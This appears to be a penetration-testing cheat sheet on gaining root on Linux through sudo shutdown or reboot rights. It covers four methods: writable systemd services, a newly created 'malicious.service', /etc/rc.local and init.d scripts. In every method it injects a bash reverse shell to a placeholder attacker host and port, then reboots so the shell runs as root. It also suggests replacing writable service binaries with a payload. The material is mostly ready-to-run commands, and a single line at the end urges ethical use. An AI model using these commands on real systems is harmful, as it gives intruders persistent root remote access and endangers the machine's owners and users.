# Privilege Escalation via `shutdown` or `reboot`

If you have **sudo privileges to shutdown or reboot**, you may be able to escalate privileges by leveraging **services** that start at boot.

## 1. Exploit Writable System Services

System services (unit files in `/etc/systemd/system/`) run as **root** on startup. If you can modify a service that runs during boot, you can insert a reverse shell or a command to add a new root user.

### Step 1: Check for Writable Services
```bash
find /etc/systemd/system/ -type f -writable 2>/dev/null
```
If any services are writable, you can modify them to execute a root shell.

NOTE: do not forget checking service files manually they may have some intresting things

### Step 2: Inject a Reverse Shell
Edit a writable service (e.g., `myservice.service`) and modify the **ExecStart** line:
```bash
sudo nano /etc/systemd/system/myservice.service
```
Replace:
```ini
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"
```
Then restart the system using your **sudo shutdown** privilege:
```bash
sudo /sbin/shutdown -r now
```
Once the system reboots, you’ll get a root shell.

## 2. Create a Malicious Systemd Service

If no existing services are writable, create a **new** systemd service that runs as root.

### Step 1: Create a New Service
```bash
echo '[Unit]
Description=Malicious Service
After=multi-user.target

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"

[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/malicious.service
```

### Step 2: Enable and Start the Service
```bash
sudo systemctl enable malicious.service
```

### Step 3: Reboot the System
```bash
sudo /sbin/shutdown -r now
```
After the reboot, the system will execute your malicious service as **root**, giving you a **reverse shell**.

## 3. Modify `/etc/rc.local` (If Present)

Older Linux systems still use `/etc/rc.local`, which executes scripts on boot **as root**.

### Step 1: Check if `/etc/rc.local` Exists
```bash
ls -la /etc/rc.local
```
If it exists and is writable, add a **root shell** command:
```bash
echo "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" | sudo tee -a /etc/rc.local
sudo chmod +x /etc/rc.local
```

### Step 2: Reboot
```bash
sudo /sbin/shutdown -r now
```
When the system boots up, the command will run as **root**.

## 4. Modify `/etc/init.d/` Scripts

If the system uses **SysVinit**, you can modify an init script.

### Step 1: Find Writable Init Scripts
```bash
find /etc/init.d/ -type f -writable 2>/dev/null
```
If you find one, append:
```bash
echo "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" | sudo tee -a /etc/init.d/someservice
```
### Step 2: Restart the System
```bash
sudo /sbin/shutdown -r now
```
On reboot, your payload executes as **root**.

## Additional Note DO NOT FORGET THESE POINTS!

- **The service files may be calling binaries that can be read or written.**
- If you find a service executing a writable binary, replace it with a malicious payload.

## Conclusion

If you can **shutdown or reboot** with `sudo`, you can escalate privileges by:
✅ **Modifying writable system services**  
✅ **Creating a new malicious systemd service**  
✅ **Editing `/etc/rc.local` or init scripts**  

Use these techniques responsibly in ethical hacking and penetration testing scenarios.
